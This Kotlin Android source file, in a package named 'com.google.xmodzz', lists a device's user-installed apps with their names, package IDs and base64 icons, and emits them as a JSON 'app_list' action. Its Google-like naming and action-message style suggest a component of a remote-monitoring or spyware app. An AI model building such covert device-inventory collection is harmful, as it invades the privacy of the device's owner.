package com.google.xmodzz

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object AppsRechive {
    fun listApps(ctx: Context, emit: (JSONObject) -> Unit) {
        val l = JSONArray()
        val pm = ctx.packageManager
        
        val installedApps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        
        for (app in installedApps) {
            try {
                // FILTER: Hanya aplikasi yang di-install user (bukan sistem)
                val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                if (!isSystem) {
                    val o = JSONObject()
                    val appName = try { pm.getApplicationLabel(app).toString() } catch (e: Exception) { app.packageName }
                    
                    o.put("name", appName)
                    o.put("pkg", app.packageName)
                    
                    try {
                        val icon = pm.getApplicationIcon(app.packageName)
                        o.put("icon", drawableToBase64(icon))
                    } catch (e: Exception) {
                        o.put("icon", "")
                    }
                    
                    l.put(o)
                }
            } catch (e: Exception) { }
        }
        
        emit(JSONObject().put("action", "app_list").put("data", l))
    }
    
    fun drawableToBase64(drawable: Drawable?): String {
        if (drawable == null) return ""
        var bitmapToUse: Bitmap? = null
        
        try {
            if (drawable is BitmapDrawable) {
                bitmapToUse = drawable.bitmap
            } else {
                val width = if (drawable.intrinsicWidth > 0) drawable.intrinsicWidth else 96
                val height = if (drawable.intrinsicHeight > 0) drawable.intrinsicHeight else 96
                val bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
                val canvas = Canvas(bmp)
                drawable.setBounds(0, 0, canvas.width, canvas.height)
                drawable.draw(canvas)
                bitmapToUse = bmp
            }
            
            val safeBitmap = bitmapToUse ?: return ""
            val resized = Bitmap.createScaledBitmap(safeBitmap, 64, 64, true)
            val baos = ByteArrayOutputStream()
            resized.compress(Bitmap.CompressFormat.PNG, 100, baos)
            val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            
            if (resized != safeBitmap) resized.recycle()
            if (drawable !is BitmapDrawable) safeBitmap.recycle()
            
            return "data:image/png;base64,$base64"
        } catch (e: Throwable) {
            return ""
        }
    }
}
